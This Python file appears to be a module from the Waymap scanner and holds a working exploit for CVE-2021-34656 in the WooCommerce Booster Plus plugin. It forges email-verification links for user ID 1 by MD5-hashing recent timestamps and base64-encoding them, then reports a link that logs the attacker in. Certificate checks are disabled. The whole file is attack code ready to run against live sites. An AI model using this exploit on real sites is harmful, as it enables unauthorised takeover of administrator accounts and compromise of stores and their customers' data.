# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2021-34656 - WooCommerce Booster Plus Plugin - Unauthenticated Email Verification Bypass

import base64
import hashlib
import requests
import time
import urllib.parse
from colorama import init, Fore, Style
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

DEFAULT_USER_ID = 1  
COUNT = 5

def generate_auth_url(profile_url, count):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Starting exploit for {profile_url} with user ID {DEFAULT_USER_ID}...")

    s = int(time.time())
    session = requests.Session()
    
    session.get(f"{profile_url}?wcj_user_id={DEFAULT_USER_ID}", verify=False)

    for i in range(count):
        s = s + i
        s_hash = hashlib.md5(str(s).encode('utf-8')).hexdigest()
        wcj_verify_email_param = base64.b64encode(f'{{"id":"{DEFAULT_USER_ID}","code":"{s_hash}"}}'.encode()).decode('utf-8')
        auth_url = f"{profile_url}?wcj_verify_email={urllib.parse.quote(wcj_verify_email_param)}"
        
        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking: {auth_url}")
        r = session.get(auth_url, allow_redirects=False, verify=False)
        
        print(f"{Style.BRIGHT}{Fore.CYAN}[•] Status Code: {r.status_code}")
        if r.status_code == 302:  
            print(f"{Style.BRIGHT}{Fore.GREEN}[+] ----- Authenticated URL Found ------")
            print(f"{auth_url}")
            print(f"{Style.BRIGHT}{Fore.GREEN}[+] -----------------------------------")
            return True 

    print(f"{Style.BRIGHT}{Fore.RED}[-] Exploit failed or no redirection detected.")
    return False 

def scan_cve_2021_34656(profile_url):
    success = generate_auth_url(profile_url, COUNT)

    if success:
        print(f"{Style.BRIGHT}{Fore.GREEN}[•] Exploit successful for {profile_url}.")
    else:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Exploit failed for {profile_url}.")
    
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Exploit finished for {profile_url}.")

    